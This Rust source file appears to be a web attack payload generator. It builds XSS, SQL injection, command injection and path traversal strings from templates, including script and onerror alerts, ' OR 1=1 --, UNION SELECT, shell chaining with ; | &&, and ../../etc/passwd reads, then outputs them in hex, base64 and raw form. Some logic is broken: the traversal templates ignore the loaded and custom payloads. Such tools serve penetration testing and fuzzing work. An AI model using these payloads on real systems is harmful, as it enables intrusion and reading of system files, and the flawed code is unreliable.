use std::fs;
use std::io::{self, BufRead};
use std::path::Path;
use rand::seq::SliceRandom;
use rand::thread_rng;
use hex;
use base64;

pub enum AttackType {
    XSS,
    SQLInjection,
    CommandInjection,
    PathTraversal(String),
}

impl AttackType {
    pub fn from_str(s: &str, custom_payload: Option<String>) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "xss" => Some(AttackType::XSS),
            "sqlinjection" => Some(AttackType::SQLInjection),
            "commandinjection" => Some(AttackType::CommandInjection),
            "pathtraversal" => custom_payload.map(AttackType::PathTraversal),
            _ => None,
        }
    }

    pub fn generate(&self) -> String {
        let payload = self.create_payload("payloads");

        let hex_payload = hex::encode(&payload);
        let base64_payload = base64::encode(&payload);
        let result = format!(
            "Hex: {}\nBase64: {}\nRaw: {}",
            hex_payload, base64_payload, payload
        );
        result
    }

    fn create_payload(&self, dir: &str) -> String {
        let mut rng = thread_rng();
        let payload_data = self.load_payloads(dir);

        match self {
            AttackType::XSS => {
                let xss_parts = vec![
                    "<script>alert('{}');</script>",
                    "<img src='x' onerror='alert(\"{}\")'>",
                    "<iframe src='javascript:alert(\"{}\")'></iframe>",
                ];
                let payload_content = payload_data.choose(&mut rng).unwrap();
                let xss_template = xss_parts.choose(&mut rng).unwrap();
                let xss_payload = xss_template.replace("{}", payload_content);
                self.obfuscate_xss(&xss_payload)
            },
            AttackType::SQLInjection => {
                let sql_parts = vec![
                    "' OR 1=1 -- {}",
                    "' UNION SELECT NULL, NULL, NULL-- {}",
                ];
                let payload_content = payload_data.choose(&mut rng).unwrap();
                let sql_template = sql_parts.choose(&mut rng).unwrap();
                let sql = sql_template.replace("{}", payload_content);
                sql
            },
            AttackType::CommandInjection => {
                let command_parts = vec![
                    "; {}",
                    "| {}",
                    "&& {}",
                    "; echo 'Injected' {}",
                ];
                let payload_content = payload_data.choose(&mut rng).unwrap();
                let command_template = command_parts.choose(&mut rng).unwrap();
                let command = command_template.replace("{}", payload_content);
                command
            },
            AttackType::PathTraversal(_) => {
                let traversal_parts = vec![
                    "../../../../etc/passwd",
                    "../etc/passwd",
                    "../../../etc/passwd",
                ];
                let traversal_template = traversal_parts.choose(&mut rng).unwrap();
                let payload_content = payload_data.choose(&mut rng).unwrap();
                let traversal = traversal_template.replace("{}", payload_content);
                traversal
            },
        }
    }

    fn obfuscate_xss(&self, payload: &str) -> String {
        // Example obfuscation: URL encoding
        payload.replace("<", "%3C").replace(">", "%3E")
    }

    fn load_payloads(&self, dir: &str) -> Vec<String> {
        let file_path = match self {
            AttackType::XSS => format!("{}/xss.txt", dir),
            AttackType::SQLInjection => format!("{}/sqlinjection.txt", dir),
            AttackType::CommandInjection => format!("{}/commandinjection.txt", dir),
            AttackType::PathTraversal(_) => format!("{}/pathtransversal.txt", dir),
        };

        println!("Loading payloads from: {}", file_path);
        if let Ok(lines) = read_lines(&file_path) {
            lines.filter_map(Result::ok).collect()
        } else {
            println!("Failed to read lines from: {}", file_path);
            vec!["Default Payload".to_string()]
        }
    }
}

fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<fs::File>>>
where
    P: AsRef<Path>,
{
    let file = fs::File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}
